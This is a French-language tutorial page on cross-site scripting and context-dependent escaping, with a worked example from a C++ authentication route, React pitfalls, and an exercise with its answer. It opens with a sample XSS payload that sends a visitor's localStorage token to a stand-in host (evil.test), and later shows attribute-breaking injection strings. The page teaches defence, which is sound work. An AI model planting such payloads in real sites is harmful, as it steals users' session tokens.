# XSS et échappement
> Une donnée utilisateur affichée sans protection peut devenir du code exécuté chez les autres.

## Mise en situation
Une biographie contient :

```html
<img src=x onerror="fetch('https://evil.test/?t='+localStorage.token)">
```

Insérée telle quelle dans la page, elle s'exécute chez chaque visiteur du profil. Le script a tous les droits de la page : lire, envoyer des messages, liker. Le sujet cite cette faille parmi celles qui ne sont pas tolérées, et elle vaut 0.

## La théorie
### La cause
C'est le même problème que l'[injection SQL](../sql/requetes-parametrees.md) : un canal mélange le code et les données. Dans le HTML, le caractère `<` ouvre une balise, qu'il vienne de toi ou de l'utilisateur.

### Les trois familles
- **Stockée** : dans la base, affichée à tous. La plus dangereuse.
- **Réfléchie** : renvoyée depuis l'URL.
- **DOM** : créée par du JavaScript côté client.

### Échapper selon le contexte
La règle dépend de l'endroit d'insertion :

- **Texte HTML** : `<` devient `&lt;`, `&` devient `&amp;`, `>` devient `&gt;`.
- **Attribut** : échapper aussi `"` et `'`, avec un attribut toujours entre guillemets.
- **URL** : encoder la valeur, et refuser `javascript:`.
- **JavaScript** : ne pas y insérer de données.

### Quand échapper
À l'affichage, pas à l'écriture. Stocker `&lt;` abîme la donnée pour tous les autres usages, comme un email texte, et on finit par échapper deux fois.

### Défense en profondeur
L'en-tête `Content-Security-Policy` limite les sources de scripts et interdit le code inline. Si un échappement manque, le navigateur refuse quand même d'exécuter le script.

## Exemple déroulé : la page de vérification
`AuthEmailRoutes.cpp` construit du HTML à la main :

```cpp
"<input type=\"hidden\" name=\"token\" value=\"" + std::string(token) + "\">"
```

Si `token` valait `"><script>...`, le script serait injecté. Aujourd'hui `hashEmailVerificationToken` valide le format avant, ce qui protège, mais c'est un effet de bord. `HtmlEscaper::escapeAttribute` rend la protection explicite :

```text
Entrée  : "><script>
Sortie  : &quot;&gt;&lt;script&gt;
```

Le navigateur l'affiche comme du texte dans la valeur.

## React
JSX échappe automatiquement `{variable}`. Les dangers sont `dangerouslySetInnerHTML`, et une URL fournie par l'utilisateur dans `href`.

## Erreurs fréquentes
- Se reposer sur une validation au lieu d'échapper.
- Oublier les emails HTML.
- Échapper pour le mauvais contexte.

## À retenir
La question n'est pas « cette donnée est-elle dangereuse ? », mais « dans quel contexte vais-je l'insérer ? ».

## Exercice
Pourquoi échapper `<` ne suffit-il pas dans `<a title=VALEUR>` ?

## Corrigé
Sans guillemets, un simple espace termine la valeur, et `x onmouseover=alert(1)` ajoute un attribut, sans aucun `<`. Il faut des guillemets autour de l'attribut, et échapper ces guillemets.

## Voir aussi

- [Cookies : HttpOnly, Secure, SameSite](cookies.md)
- [Valider les entrées](validation-entrees.md)
- [UTF-8 : octets et caractères](../cpp/utf-8.md)
